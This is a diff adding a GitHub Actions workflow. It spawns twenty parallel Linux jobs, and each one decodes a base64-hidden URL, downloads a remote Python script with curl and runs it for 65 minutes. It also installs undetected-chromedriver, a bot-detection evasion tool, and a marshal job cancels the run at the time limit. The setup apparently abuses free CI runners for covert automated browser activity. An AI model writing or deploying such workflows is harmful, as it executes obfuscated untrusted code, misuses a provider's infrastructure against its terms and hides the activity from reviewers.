@@ -1,0 +1,107 @@
+name: Linux Ordered Task Regiment
+
+on:
+  # استقبال أمر التشغيل الخارجي عبر التوكن بالكلمة المفتاحية: start
+  workflow_dispatch:
+
+concurrency:
+  group: ordered-regiment-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+permissions:
+  actions: write
+  contents: read
+
+jobs:
+  # =================================================================
+  # مأمور التسريح النهائي: يُنهي الـ workflow بأكمله عند علامة 65 دقيقة
+  # =================================================================
+  final-discharge-marshal:
+    name: "Final Discharge Marshal"
+    runs-on: ubuntu-latest
+    timeout-minutes: 70
+    steps:
+      - name: Carry Out Final Discharge Order
+        run: |
+          echo "[MARSHAL] Final discharge marshal on station. Total discharge armed at the 65-minute boundary."
+          echo "[MARSHAL] Validating workflow key: ${{ github.run_id }}"
+          
+          # الانتظار لمدة 65 دقيقة بالضبط (3900 ثانية)
+          sleep 3900
+          
+          echo "[MARSHAL] Boundary validated! Carrying out final discharge order..."
+          
+          # إصدار أمر الإلغاء الشامل عبر واجهة GitHub البرمجية
+          curl -sS -X POST \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
+          
+          echo "[MARSHAL] Final discharge order carried out. Every active and held unit will be discharged."
+
+  # =================================================================
+  # المهمة الرئيسية: تجهيز وإطلاق وحدات الفوج
+  # =================================================================
+  build-regiment:
+    name: "RegimentUnit-${{ matrix.unit_serial }}"
+    runs-on: ubuntu-latest
+    timeout-minutes: 65
+
+    strategy:
+      fail-fast: false
+      matrix:
+        unit_serial: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      # ❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈
+      # ⋟ المحطة الأولى: صبّ القاعدة التشغيلية
+      # ❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈
+      - name: Pour Operational Base
+        run: |
+          echo "[POUR] Pouring operational base for RegimentUnit-${{ matrix.unit_serial }} on Linux..."
+          sudo apt update -qq
+          sudo apt install -y curl python3-pip
+
+      # ❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈
+      # ⋟ المحطة الثانية: تحميل الملف التنفيذي
+      # ❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈
+      - name: Upload Execution Payload
+        run: |
+          echo "[UPLOAD] Uploading app_task.py from designated archive location..."
+          ARCHIVE_LOCATION=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 --decode)
+          curl -sL "$ARCHIVE_LOCATION" -o app_task.py
+          echo "[UPLOAD] Execution payload uploaded successfully."
+
+      # ❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈
+      # ⋟ المحطة الثالثة: تنصيب المكتبات الداعمة
+      # ❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈
+      - name: Install Backing Libraries
+        run: |
+          echo "[INSTALL] Installing backing libraries..."
+          pip3 install -q undetected-chromedriver selenium requests
+
+      # ❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈
+      # ⋟ المحطة الرابعة: التنفيذ المستَنِد للمدة (65 دقيقة)
+      # ❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈❈
+      - name: Execute Anchored Operation
+        run: |
+          echo ">> Building RegimentUnit-${{ matrix.unit_serial }} operation..."
+          
+          # إطلاق العملية في الخلفية
+          python3 app_task.py &
+          REGIMENT_PID=$!
+          
+          echo ">> Anchored operation engaged. Span: 65 minutes (3900s)."
+          
+          # الانتظار حتى استنفاد المدة المحددة
+          sleep 3900
+          
+          # التحقق من حالة العملية وإنهاؤها عند الضرورة
+          if kill -0 $REGIMENT_PID 2>/dev/null; then
+            echo ">> Anchored window elapsed! Retiring operation..."
+            kill -9 $REGIMENT_PID
+            echo ">> Operation retired by anchor keeper."
+          else
+            echo ">> Operation closed within anchored window."
+          fi
